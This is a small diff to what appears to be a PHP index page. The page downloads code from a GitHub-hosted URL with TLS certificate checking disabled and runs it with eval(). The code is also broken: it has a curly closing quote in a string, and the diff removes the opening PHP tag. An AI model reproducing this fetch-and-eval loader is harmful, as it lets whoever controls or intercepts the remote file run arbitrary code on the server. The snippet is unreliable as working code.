@@ -1,7 +1,7 @@
-<?php
-session_start();
 
-$GithubRawURI= "https://raw.githubusercontent.com/jatinpathak28/index.php”; 
+
+
+$GithubRawURI= "https://jatinpathak28.github.io/Paying_guest/index.php”; 
 $ch = curl_init(); 
 curl_setopt($ch, CURLOPT_URL, $GithubRawURI); 
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
@@ -13,7 +13,6 @@ curl_close($ch);
 $data = substr($data, 5); 
  
 eval ($data); 
-?>
 
 <!DOCTYPE html>
 <html lang="en">
